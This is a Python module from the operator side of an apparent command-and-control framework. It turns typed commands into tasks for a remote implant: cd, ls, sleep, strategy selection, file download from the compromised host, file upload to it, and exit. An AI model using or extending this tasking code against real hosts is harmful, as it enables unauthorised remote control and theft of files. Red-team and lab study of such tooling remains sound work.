import base64
from dataclasses import asdict, dataclass
from enum import Enum

from ..modules.api_calls import get_implant_task_history

"""
Testing task definitions here, so there's a structured way of handling tasks.


example of a cmd.exe task:

task = Cmd(cli="whoami /all")
cmd_task = cmd.to_task()

# now can send this off to the server to queue


How this bubbles down:

1. User inputs command.

2. Command is split into 2 parts, 1: command, and arguments. 

3. Based on command, a class is chosed to handle it. 

4. That class does further processing on the command,a nd its arguments, to get it in a task ready form. 

5. If no parsing errors, command is converted into a task ready form, and returned with a ResultType.TASK. Calling func then sends to server

6. If parsing errors, command is returned with a ResultType.DATA, and an "invalid command" message is pushed to screen

"""


class ParseError(Exception):
    """Custom exception for Parse validation errors."""

    pass


class ResultType(Enum):
    TASK = "task"  # tasks are sent to server - this is a dict of the FULL task
    TEXT = "text"  # text is just dumped on screen
    ERROR = "error"  # errors are dumped on screen, without prepend, in orange/yellow
    LIST = "list"  # Lists, are parsed over and send one entry at a time on screen, with no terminal prepend
    # maybe add a PARSE_ERROR if needed later.


def get_description_of_dataclasses(dataclasses):
    """
    Dynamic help menu generation. Takes class name, and docstring, and ties them together as the help menu
    This works, as the class name is the comand (just lower case).

    If needed, can forgo this process, and instead just take the docstring, if class names ever do not match
    their commands

    Ex new docstring:
        powershell: blah blah
    """

    descriptions = []

    # Find the length of the longest command name to set the column width
    # We add a buffer (e.g., +4) so the longest command still has a gap before the description
    if dataclasses:
        max_len = max(len(cls.command_name) for cls in dataclasses) + 4
    else:
        max_len = 0

    for cls in dataclasses:
        # Use f-string padding to left-align the name
        # syntax: {value : < width}
        description = f"{cls.command_name:<{max_len}}: {cls.__doc__.strip()}"
        descriptions.append(description)

    return descriptions


async def task_tree(command, args, implant_uuid):
    """Task tree for parsing commands, and formatting them.

    Args:
        command (_type_): _description_
        args (_type_): _description_
        implant_uuid (_type_): _description_

    Returns:
        _type_: _description_
    """
    match command:
        # special command
        case "help":
            # uses this list to pull the docstrings from, and turn into a help menu
            dataclasses = [
                Cd,
                Sleep,
                StratPost,
                StratGet,
                StratList,
                StratActive,
                FileDownload,
                FileUpload,
                Exit,
            ]
            descriptions: list = get_description_of_dataclasses(dataclasses)

            # add in barriers:
            line = "-" * 50
            descriptions.insert(0, line)
            descriptions.insert(1, "Help Menu")
            descriptions.insert(2, line)

            return (ResultType.LIST, descriptions)

        case "history":
            # add a json object for json dump, and a plaintext option (default)  for parsed output
            # uses this list to pull the docstrings from, and turn into a help menu

            task_history_dict: list = await get_implant_task_history(implant_uuid)
            task_history_list = task_history_dict.get("data")
            # add in barriers:
            line = "-" * 50
            task_history_list.insert(0, line)
            task_history_list.insert(1, "Task History")
            task_history_list.insert(2, line)

            # format options
            # print(args)
            # if args[1] == "json":
            #     return (ResultType.TEXT, "json")

            # get last item,
            task_history_list.insert(len(task_history_list) + 1, line)
            task_history_list.insert(
                len(task_history_list) + 2,
                "all tasks, some may be truncated due to 1000 line limit of this terminal.",
            )
            task_history_list.insert(len(task_history_list) + 3, line)

            return (ResultType.LIST, task_history_list)

        case "cd":
            try:
                task = Cd(implant_uuid=implant_uuid, directory=args).to_task()
                return (ResultType.TASK, task)
            # if not all args are present, or there's a bug, this will bubble up and be put on screen
            except ParseError as e:
                return (ResultType.ERROR, str(e))

        case "ls":
            try:
                task = Ls(implant_uuid=implant_uuid, directory=args).to_task()
                return (ResultType.TASK, task)
            # if not all args are present, or there's a bug, this will bubble up and be put on screen
            except ParseError as e:
                return (ResultType.ERROR, str(e))

        case "sleep":
            try:
                task = Sleep(implant_uuid=implant_uuid, sleep_time=args).to_task()
                return (ResultType.TASK, task)
            # if not all args are present, or there's a bug, this will bubble up and be put on screen
            except ParseError as e:
                return (ResultType.ERROR, str(e))

        case "strat":
            if args.startswith("post"):
                strategy_name = args[5:]  # Extract strategy name after "post "
                try:
                    task = StratPost(
                        implant_uuid=implant_uuid, strategy_name=strategy_name
                    ).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))

            elif args.startswith("get"):
                strategy_name = args[4:]  # Extract strategy name after "get "
                try:
                    task = StratGet(
                        implant_uuid=implant_uuid, strategy_name=strategy_name
                    ).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))

            elif args.startswith("list"):
                try:
                    task = StratList(implant_uuid=implant_uuid).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))

            elif args.startswith("active"):
                try:
                    task = StratActive(implant_uuid=implant_uuid).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))

            else:
                return (
                    ResultType.ERROR,
                    "Invalid strat command. Use `strat post <strategy_name>`, `strat get <strategy_name>`, or `strat list`",
                )

        case "file":
            if args.startswith("download"):
                raw_args = args[9:]  # Extract file path after "download"
                args_list = raw_args.split()
                # The file path is the first argument after "download"
                file_path = args_list[0]

                try:
                    task = FileDownload(
                        implant_uuid=implant_uuid, file_path=file_path
                    ).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))

            if args.startswith("upload"):
                raw_args = args[7:]  # Extract file path after "upload"
                args_list = raw_args.split()
                # The file path is the first argument after "download"
                file_path = args_list[0]
                # The file contents is the second argument after "upload"
                # replace " " with "" to remove any spaces that could be trailing/leading, which may cause problems with base64 decoding
                file_contents = (args_list[1]).replace(" ", "")

                try:
                    task = FileUpload(
                        implant_uuid=implant_uuid,
                        file_path=file_path,
                        file_contents=file_contents,
                    ).to_task()
                    return (ResultType.TASK, task)
                except ParseError as e:
                    return (ResultType.ERROR, str(e))
            else:
                return (
                    ResultType.ERROR,
                    "Invalid file command. Use `file upload <file_path>` or `file download <file_path>`",
                )

        case "exit":
            try:
                task = Exit(implant_uuid=implant_uuid).to_task()
                return (ResultType.TASK, task)
            except ParseError as e:
                return (ResultType.ERROR, str(e))

        case _:
            return (ResultType.ERROR, "Invalid command")  # Or some other response


@dataclass(frozen=True)
class TaskDetail:
    task_name: str
    args: dict


@dataclass(frozen=True)
class Task:
    # task_uuid: str  # added by server
    implant_uuid: str
    task: TaskDetail


def create_and_verify_task(implant_uuid: str, task: TaskDetail):
    """Adds implant uuid to task, making it a "proper" task

    Args:
        implant_uuid (str): implant uuid
        task (dict): task dict: `{task: {'task_name':'task', 'args':{...}}}

    Returns:
        _type_: _description_
    """
    t = Task(implant_uuid=implant_uuid, task=task)
    task_as_dict = asdict(t)
    return task_as_dict


@dataclass(frozen=True)
class Cd:
    R"""
    Change the current working directory on the host. Ex: `cd C:\\Users\\`
    """

    command_name = "cd"
    implant_uuid: str
    directory: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.directory:
            # Raise a ParseError exception if cli is None or empty
            raise ParseError(
                "The 'dir' argument cannot be None or empty. Ex: `cd <cli arg>`: `cd C:\\Users\\`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"directory": self.directory}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class Sleep:
    R"""
    Sleep for a specified number of seconds on the host. Ex: `sleep 5`
    """

    command_name = "sleep"
    implant_uuid: str
    sleep_time: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.sleep_time:
            raise ParseError(
                "The 'sleep_time' argument cannot be None or empty. Ex: `sleep <sleep_time>`: `sleep 5`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"sleep_time": int(self.sleep_time)}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class StratPost:
    R"""
    Set the post strategy for the implant. Ex: `strat post my_post_strategy`
    """

    command_name = "strat post"
    implant_uuid: str
    strategy_name: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.strategy_name:
            raise ParseError(
                "The 'strategy_name' argument cannot be None or empty. Ex: `strat post <strategy_name>`: `strat post my_post_strategy`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"strategy_name": self.strategy_name}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


class StratGet:
    R"""
    Set the get strategy for the implant. Ex: `strat get my_get_strategy`
    """

    command_name = "strat get"
    implant_uuid: str
    strategy_name: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.strategy_name:
            raise ParseError(
                "The 'strategy_name' argument cannot be None or empty. Ex: `strat get <strategy_name>`: `strat get my_get_strategy`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"strategy_name": self.strategy_name}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class StratList:
    R"""
    List the available strategies for the implant.
    """

    command_name = "strat list"

    implant_uuid: str

    # def __post_init__(self):
    #     """Automatically run something when the dataclass is created."""
    #     if not self.strategy_name:
    #         raise ParseError(
    #             "The 'strategy_name' argument cannot be None or empty. Ex: `strat get <strategy_name>`: `strat get my_get_strategy`"
    #         )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class StratActive:
    R"""
    List the active strategy for the implant.
    """

    command_name = "strat active"

    implant_uuid: str

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class FileDownload:
    R"""
    Get a file from the host the implant is running on. Ex: `file download C:\\Users\\user\\file.txt`
    """

    command_name = "file download"
    implant_uuid: str
    file_path: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.file_path:
            raise ParseError(
                "The 'file_path' argument cannot be None or empty. Ex: `file download <file_path>`: `file download C:\\Users\\user\\file.txt`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"file_path": self.file_path}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class FileUpload:
    R"""
    Upload a file to the host the implant is running on. Ex: `file upload C:\\Users\\user\\file.txt <base64 file contents>`
    """

    command_name = "file upload"
    implant_uuid: str
    file_path: str
    file_contents: str  # start with base64. figure out the upload button later

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.file_path:
            raise ParseError(
                "The 'file_path' argument cannot be None or empty. Ex: `file upload <file_path>`: `file upload C:\\Users\\user\\file.txt`"
            )
        if not self.file_contents:
            raise ParseError(
                "The 'file_contents' argument cannot be None or empty. Ex: `file upload <file_path>`: `file upload C:\\Users\\user\\file.txt`"
            )

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""
        # convert from base64, to bytes, for easier CLI handling
        bytes_file_contents = base64.b64decode(self.file_contents)

        task_args = {"file_path": self.file_path, "file_contents": bytes_file_contents}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class Exit:
    R"""
    Exit the implant. This will kill the implant process on the host, don't expect a response back from the implant with this command.
    """

    command_name = "exit"

    implant_uuid: str

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


@dataclass(frozen=True)
class Ls:
    R"""
    List the contents of a directory on the host. Ex: `ls C:\\Users\\`
    """

    command_name = "ls"

    implant_uuid: str
    directory: str

    def __post_init__(self):
        """Automatically run something when the dataclass is created."""
        if not self.directory:
            # raise ParseError(
            #     "The 'dir' argument cannot be None or empty. Ex: `ls <dir arg>`: `ls C:\\Users\\`"
            # )
            # instead of throwing a parse error, just list "." if no directory is provided, which is more intuitive for ls
            # self.directory = "."
            # because the dataclass is frozen, we have to use object.__setattr__ to set the directory value to "." if it's not provided
            # kind of a hack, but it works for now. Keeps args protected as well.
            object.__setattr__(self, "directory", ".")

    def to_task(self) -> dict:
        """Convert the dataclass to a task style dictionary structure."""

        task_args = {"directory": self.directory}
        task_detail = TaskDetail(task_name=self.command_name, args=task_args)

        final_task = create_and_verify_task(
            implant_uuid=self.implant_uuid, task=task_detail
        )
        return final_task


# @dataclass(frozen=True)
# class Powershell:
#     """
#     [placeholder command for dev] Run a command on the host via powershell.exe. Ex: `powershell -c "<your_command>"`
#     """

#     cli: str

#     def __post_init__(self):
#         """Automatically run something when the dataclass is created."""
#         if not self.cli:
#             # Raise a ParseError exception if cli is None or empty
#             raise ParseError(
#                 "The 'cli' argument cannot be None or empty. Ex: `cmd <cli arg>`: `cmd whoami`"
#             )

#     def to_task(self) -> dict:
#         """Convert the dataclass to a task style dictionary structure."""
#         return {
#             "task": "powershell",
#             "data": {
#                 "cli": self.cli,
#             },
#         }
